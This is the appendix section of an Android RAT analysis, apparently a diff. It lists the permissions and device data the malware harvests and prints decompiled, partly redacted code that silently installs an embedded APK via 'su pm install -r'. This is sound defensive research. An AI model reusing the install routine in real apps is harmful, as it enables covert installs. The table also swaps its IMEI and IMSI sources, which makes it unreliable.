+android.permission.WRITE_EXTERNAL_STORAGE
+android.permission.SET_WALLPAPER
+android.permission.SET_WALLPAPER_HINTS
+android.permission.RECEIVE_BOOT_COMPLETED
+android.permission.KILL_BACKGROUND_PROCESSES
+android.permission.VIBRATE
+android.permission.CAMERA
+android.permission.GET_ACCOUNTS
+android.permission.WAKE_LOCK
+android.permission.ACCESS_NETWORK_STATE
+android.permission.WRITE_CONTACTS
+android.permission.READ_CONTACTS
+android.permission.RECORD_AUDIO
+android.permission.READ_SMS
+android.permission.ACCESS_WIFI_STATE
+android.permission.CHANGE_WIFI_STATE
+android.permission.READ_CALL_LOG
+android.permission.INTERNET
+android.permission.READ_PHONE_STATE
+android.permission.CALL_PHONE
+android.permission.ACCESS_COARSE_LOCATION
+android.permission.ACCESS_FINE_LOCATION
+android.permission.RECEIVE_SMS
+android.permission.GET_TASKS
+android.permission.PROCESS_OUTGOING_CALLS
+android.permission.BROADCAST_PACKAGE_ADDED
+android.permission.BROADCAST_PACKAGE_CHANGED
+android.permission.BROADCAST_PACKAGE_INSTALL
+android.permission.BROADCAST_PACKAGE_REPLACED
+com.sec.android.provider.badge.permission.READ
+com.sec.android.provider.badge.permission.WRITE
+com.htc.launcher.permission.READ_SETTINGS
+com.htc.launcher.permission.UPDATE_SHORTCUT
+com.sonyericsson.home.permission.BROADCAST_BADGE
+com.sonymobile.home.permission.PROVIDER_INSERT_BADGE
+com.anddoes.launcher.permission.UPDATE_COUNT
+com.majeur.launcher.permission.UPDATE_BADGE
+com.huawei.android.launcher.permission.CHANGE_BADGE
+com.huawei.android.launcher.permission.READ_SETTINGS
+com.huawei.android.launcher.permission.WRITE_SETTINGS
+android.permission.READ_APP_BADGE
+com.oppo.launcher.permission.READ_SETTINGS
+com.oppo.launcher.permission.WRITE_SETTINGS
+me.everything.badger.permission.BADGE_COUNT_READ
+me.everything.badger.permission.BADGE_COUNT_WRITE
+android.permission.BIND_ACCESSIBILITY_SERVICE
+```
+
+### Appendix B: Full list of data that malware extracts
+
+| Category              | Information                                | Source                                                       |
+| --------------------- | ------------------------------------------ | ------------------------------------------------------------ |
+| Device information    | Device name                                | `android.provider.Settings.System`                           |
+|                       | Model                                      | `android.os.Build.MODEL`                                     |
+|                       | Board                                      | `android.os.Build.BOARD`                                     |
+|                       | Brand                                      | `android.os.Build.BRAND`                                     |
+|                       | Bootloader                                 | `android.os.Build.BOOTLOADER`                                |
+|                       | Device                                     | `android.os.Build.DEVICE`                                    |
+|                       | Display                                    | `android.os.Build.DISPLAY`                                   |
+|                       | Fingerprint                                | `android.os.Build.FINGERPRINT`                               |
+|                       | Hardware                                   | `android.os.Build.HARDWARE`                                  |
+|                       | Host                                       | `android.os.Build.HOST`                                      |
+|                       | ID                                         | `android.os.Build.ID`                                        |
+|                       | Manufacturer                               | `android.os.Build.MANUFACTURER`                              |
+|                       | Product                                    | `android.os.Build.PRODUCT`                                   |
+|                       | Serial                                     | `android.os.Build.SERIAL`                                    |
+|                       | Tags                                       | `android.os.Build.TAGS`                                      |
+|                       | User                                       | `android.os.Build.USER`                                      |
+|                       | Time                                       | `android.os.Build.TIME`                                      |
+| System information    | Release version                            | `android.os.Build.VERSION.RELEASE`                           |
+|                       | SDK version                                | `android.os.Build.VERSION.SDK_INT`                           |
+|                       | Language                                   | `java.util.Locale.getDefault().getDisplayLanuage()`          |
+| SIM information       | IMEI                                       | `android.telephony.TelephonyManager.getSubscriberId()`       |
+|                       | IMSI                                       | `android.telephony.TelephonyManager.getDeviceId()`           |
+|                       | SIM serial number                          | `android.telephony.TelephonyManager.getSimSerialNumber()`    |
+|                       | SIM operator                               | `android.telephony.TelephonyManager.getSimOperator()`        |
+|                       | SIM operator name                          | `android.telephony.TelephonyManager.getSimOperatorName()`    |
+|                       | Line number                                | `android.telephony.TelephonyManager.getLine1Number()`        |
+|                       | SIM country ISO                            | `android.telephony.TelephonyManager.getSimCountryIso()`      |
+|                       | Mobile Country Code (MCC)                  | `android.telephony.TelephonyManager.getSimOperator()`        |
+|                       | Mobile Network Code (MNC)                  | `android.telephony.TelephonyManager.getSimOperator()`        |
+|                       | Cell ID (CID)                              | `android.telephony.gsm.GsmCellLocation.getCellLocation().getCid()` |
+|                       | Location Area Code (LAC)                   | `android.telephony.gsm.GsmCellLocation.getCellLocation().getLac()` |
+|                       | SIM state                                  | `android.telephony.TelephonyManager.getSimState()`           |
+|                       | Mobile data availability                   | `android.provider.Settings.System` (SDK >=17 )<br />`android.provider.Settings.Secure` (SDK < 17) |
+| WiFi information      | MAC address                                | `android.net.wifi.WifiInfo.getMacAddress()`                  |
+|                       | SSID                                       | `android.net.wifi.WifiInfo.getSSID()`                        |
+|                       | Link speed                                 | `android.net.wifi.WifiInfo.getLinkSpeed()`                   |
+|                       | Received Signal Strength Indication (RSSI) | `android.net.wifi.WifiInfo.getRssi()`                        |
+|                       | Availability                               | `android.net.wifi.WifiManager.isWifiEnabled()`               |
+| Audio information     | Phone ring max volume                      | `android.media.AudioManager.getStreamMaxVolume(int streamType)` |
+|                       | Phone ring volume                          | `android.media.AudioManager.getStreamVolume(int streamType)` |
+|                       | Music playback max volume                  | `android.media.AudioManager.getStreamMaxVolume(int streamType)` |
+|                       | Music playback volume                      | `android.media.AudioManager.getStreamVolume(int streamType)` |
+|                       | Notifications max volume                   | `android.media.AudioManager.getStreamMaxVolume(int streamType)` |
+|                       | Notifications volume                       | `android.media.AudioManager.getStreamVolume(int streamType)` |
+|                       | System sounds max volume                   | `android.media.AudioManager.getStreamMaxVolume(int streamType)` |
+|                       | System sounds volume                       | `android.media.AudioManager.getStreamVolume(int streamType)` |
+|                       | Ringer mode                                | `android.media.AudioManager.getRingerMode()`                 |
+| Bluetooth information | Is adapter available                       | `android.bluetooth.BluetoothAdapter.getDefaultAdapter()`     |
+| Location information  | Is GPS location service enabled            | `android.location.LocationManager`                           |
+
+### Appendix C: Pseudo code installing embedded application
+
+```
+ L_0x004b: // accessing embedded google.apk
+     java.lang.StringBuilder r1 = new java.lang.StringBuilder     
+     r1.<init>()     
+     r1.append(r0)     
+     java.lang.String r0 = "/base.apk"
+     r1.append(r0)     
+     java.lang.String r0 = r1.toString()     
+     com.android.tester.C7 r1 = com.android.tester.C0533C7.this     
+     android.content.Context r1 = r1.getApplicationContext()     
+     android.content.res.Resources r1 = r1.getResources()     
+     r2 = 2131427328(0x7f0b0000, float:1.847627E38) // res/raw/google.apk
+     java.io.InputStream r1 = r1.openRawResource(r2)     
+     int r2 = r1.available()     
+     if (r2 == 0) goto L_0x015a // return
+/*
+REDACTED: saving res/raw/google.apk to base.apk on SD card
+*/
+ L_0x00bd: // installing base.apk
+     r1.close()     
+     r3.close()     
+     boolean r1 = r3     
+     r2 = 1
+     if (r1 != r2) goto L_0x012e
+     java.lang.Runtime r1 = java.lang.Runtime.getRuntime()     
+     java.lang.String r3 = "su"
+     java.lang.Process r1 = r1.exec(r3)     
+     java.io.OutputStream r3 = r1.getOutputStream()     
+     java.lang.StringBuilder r4 = new java.lang.StringBuilder     
+     r4.<init>()     
+     java.lang.String r5 = "pm install -r "
+     r4.append(r5)     
+     r4.append(r0)     
+     java.lang.String r0 = r4.toString()     
+     java.lang.String r4 = "ASCII"
+     byte[] r0 = r0.getBytes(r4)     
+     r3.write(r0)     
+     r3.flush()     
+     r3.close()     
+     r1.waitFor()     
+     int r0 = r1.exitValue()     
+     if (r0 != 0) goto L_0x015a // return (no permission to execute command)
+     com.android.tester.C7 r0 = com.android.tester.C0533C7.this     
+     android.content.Context r0 = r0.getApplicationContext()     
+     android.content.res.Resources r0 = r0.getResources()     
+     r1 = 2131492864(0x7f0c0000, float:1.8609192E38) // ".."
+     java.lang.String r0 = r0.getString(r1)     
+/*
+REDACTED: additional checks
+*/
+ L_0x012e: // running installed app as an intent
+     android.content.Intent r1 = new android.content.Intent     
+     java.lang.String r2 = "android.intent.action.VIEW"
+     r1.<init>(r2)     
+     r2 = 268468224(0x10008000, float:2.5342157E-29)
+     r1.setFlags(r2)     
+     java.lang.StringBuilder r2 = new java.lang.StringBuilder     
+     r2.<init>()     
+     java.lang.String r3 = "file://"
+     r2.append(r3)     
+     r2.append(r0)     
+     java.lang.String r0 = r2.toString()     
+     android.net.Uri r0 = android.net.Uri.parse(r0)     
+     java.lang.String r2 = "application/vnd.android.package-archive"
+     r1.setDataAndType(r0, r2)     
+     com.android.tester.C7 r0 = com.android.tester.C0533C7.this     
+     r0.startActivity(r1)     
+ L_0x015a:
+     return
+```
+
+## References
+
+[^1]: [https://blog.lookout.com/nation-state-mobile-malware-targets-syrians-with-covid-19-lures](https://blog.lookout.com/nation-state-mobile-malware-targets-syrians-with-covid-19-lures)
+[^2]: [https://blog.malwarebytes.com/threats/remote-access-trojan-rat/](https://blog.malwarebytes.com/threats/remote-access-trojan-rat/)
+[^3]: [Full list of permissions used by the analyzed application](#Appendix A: Full list of permissions used by the analyzed application)
+[^4]: [https://www.makeuseof.com/tag/android-accessibility-services-can-used-hack-phone/](https://www.makeuseof.com/tag/android-accessibility-services-can-used-hack-phone/)
+[^5]:[Pseudo code installing embedded application](#Appendix C: Pseudo code installing embedded application)
+[^6]: [Footage of cracked SpyNote v6.4 server](https://www.youtube.com/watch?v=zJXk4FCHx_0)
+[^7]: [https://developer.android.com/guide/topics/admin/device-admin](https://developer.android.com/guide/topics/admin/device-admin)
+[^8]: [Full list of data that malware extracts](#Appendix B: Full list of data that malware extracts)
+[^9]: [https://developer.android.com/reference/android/media/MediaRecorder.AudioSource](https://developer.android.com/reference/android/media/MediaRecorder.AudioSource)
+[^10]: [https://tools.ietf.org/html/rfc1952#section-2.2](https://tools.ietf.org/html/rfc1952#section-2.2)
+[^11]: [https://tools.ietf.org/html/rfc4648](https://tools.ietf.org/html/rfc4648)
